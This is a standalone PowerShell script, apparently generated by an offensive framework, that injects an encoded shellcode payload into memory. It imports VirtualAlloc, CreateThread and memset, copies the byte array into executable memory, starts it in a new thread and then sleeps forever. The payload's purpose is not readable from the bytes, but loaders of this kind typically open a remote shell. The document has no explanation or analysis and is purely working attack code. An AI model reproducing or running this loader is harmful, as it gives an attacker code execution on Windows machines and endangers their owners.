
$mSE3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $mSE3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcb,0xbe,0x73,0x99,0x57,0x34,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x72,0x14,0x03,0x72,0x67,0x7b,0xa2,0xc8,0x6f,0xf9,0x4d,0x31,0x6f,0x9e,0xc4,0xd4,0x5e,0x9e,0xb3,0x9d,0xf0,0x2e,0xb7,0xf0,0xfc,0xc5,0x95,0xe0,0x77,0xab,0x31,0x06,0x30,0x06,0x64,0x29,0xc1,0x3b,0x54,0x28,0x41,0x46,0x89,0x8a,0x78,0x89,0xdc,0xcb,0xbd,0xf4,0x2d,0x99,0x16,0x72,0x83,0x0e,0x13,0xce,0x18,0xa4,0x6f,0xde,0x18,0x59,0x27,0xe1,0x09,0xcc,0x3c,0xb8,0x89,0xee,0x91,0xb0,0x83,0xe8,0xf6,0xfd,0x5a,0x82,0xcc,0x8a,0x5c,0x42,0x1d,0x72,0xf2,0xab,0x92,0x81,0x0a,0xeb,0x14,0x7a,0x79,0x05,0x67,0x07,0x7a,0xd2,0x1a,0xd3,0x0f,0xc1,0xbc,0x90,0xa8,0x2d,0x3d,0x74,0x2e,0xa5,0x31,0x31,0x24,0xe1,0x55,0xc4,0xe9,0x99,0x61,0x4d,0x0c,0x4e,0xe0,0x15,0x2b,0x4a,0xa9,0xce,0x52,0xcb,0x17,0xa0,0x6b,0x0b,0xf8,0x1d,0xce,0x47,0x14,0x49,0x63,0x0a,0x70,0xbe,0x4e,0xb5,0x80,0xa8,0xd9,0xc6,0xb2,0x77,0x72,0x41,0xfe,0xf0,0x5c,0x96,0x01,0x2b,0x18,0x08,0xfc,0xd4,0x59,0x00,0x3a,0x80,0x09,0x3a,0xeb,0xa9,0xc1,0xba,0x14,0x7c,0x7f,0xbe,0x82,0xbf,0x28,0xc1,0x57,0x28,0x2b,0xc2,0x56,0x13,0xa2,0x24,0x08,0x33,0xe5,0xf8,0xe8,0xe3,0x45,0xa9,0x80,0xe9,0x49,0x96,0xb0,0x11,0x80,0xbf,0x5a,0xfe,0x7d,0x97,0xf2,0x67,0x24,0x63,0x63,0x67,0xf2,0x09,0xa3,0xe3,0xf1,0xee,0x6d,0x04,0x7f,0xfd,0x19,0xe4,0xca,0x5f,0x8f,0xfb,0xe0,0xca,0x2f,0x6e,0x0f,0x5d,0x78,0x06,0x0d,0xb8,0x4e,0x89,0xee,0xef,0xc5,0x00,0x7b,0x50,0xb1,0x6c,0x6b,0x50,0x41,0x3b,0xe1,0x50,0x29,0x9b,0x51,0x03,0x4c,0xe4,0x4f,0x37,0xdd,0x71,0x70,0x6e,0xb2,0xd2,0x18,0x8c,0xed,0x15,0x87,0x6f,0xd8,0xa7,0xfb,0xb9,0x24,0xd2,0x15,0x7a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$hj1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($hj1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$hj1,0,0,0);for (;;){Start-sleep 60};
